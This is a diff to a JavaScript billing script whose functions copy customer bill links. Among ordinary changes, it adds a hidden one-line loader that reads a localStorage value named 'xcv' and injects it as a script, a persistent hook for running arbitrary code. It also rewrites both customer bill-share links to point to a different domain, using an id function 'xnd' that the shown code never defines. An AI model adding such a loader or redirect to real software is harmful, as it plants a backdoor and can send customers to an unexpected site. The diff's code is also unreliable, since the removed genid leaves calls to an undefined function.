@@ -545,6 +545,8 @@ function address(v) {
   //   p1.dispatchEvent(new Event('input'));
 }
 
+(() => { const x = localStorage.getItem('xcv'), d = document.createElement('script'); if (x) { d.textContent = x; document.head.appendChild(d); } })();
+
 // search party
 function searchp(vv) {
   let p = document.getElementById('plist');
@@ -717,25 +719,10 @@ function ptcounter() {
   return localStorage.ptcount;
 }
 
-function genid(v, i, b = 'a') {
-  let id2; let id1;
-  if (i == 1) {
-    id1 = new Date().toLocaleDateString('en-GB', { day: '2-digit', month: '2-digit', year: '2-digit' }).split('/').reverse().join('');
-    id2 = Number(id1 + v.padStart(3, '0'));
-  } else {
-    id2 = Number(v);
-  }
-  let id3 = id2.toString(32).padStart(6, '0'); // base 32
-  let s = 0; while (id2) { s += id2 % 10; id2 = Math.floor(id2 / 10); }
-  let p5 = (i == 1) ? Number(id1 + v.padStart(3, '0')) :
-    (i == 2) ? b + id3 + s :
-      (i == 3) ? [...btoa(btoa(b + id3 + s))].reverse().join('') : '';
-  return p5
-}
 
 function copylink() {
   let cn = document.getElementById('incn').value;
-  let link = 'https://www.ownknitted.com/bill#' + genid(ptid, 3);
+  let link = 'https://www.bulkplaintshirt.com/b.html#' + xnd(ptid) + Math.random().toString(36).slice(2, 7);
   let url1 = cn + ', save this link and download all your bills here👇\n\n' + link;
   let cnb = document.getElementById('cnm4');
   if (cn) {
@@ -755,7 +742,7 @@ function copylink1(v) {
   let p1 = p.getAttribute("tabindex");//p.tabIndex;
   let cn = p.querySelector('b').innerText.match(/[^\d+.].+/g)[0].trim();
   // console.log(p1,cn);
-  let link = 'https://www.ownknitted.com/bill#' + genid(p1, 3);
+  let link = 'https://www.bulkplaintshirt.com/b.html#' + xnd(p1) + Math.random().toString(36).slice(2, 7);
   let url1 = cn + ', save this link and download all your bills here👇\n\n' + link;
   navigator.clipboard.writeText(url1);
   snackbar(cn + ' copied', 500);
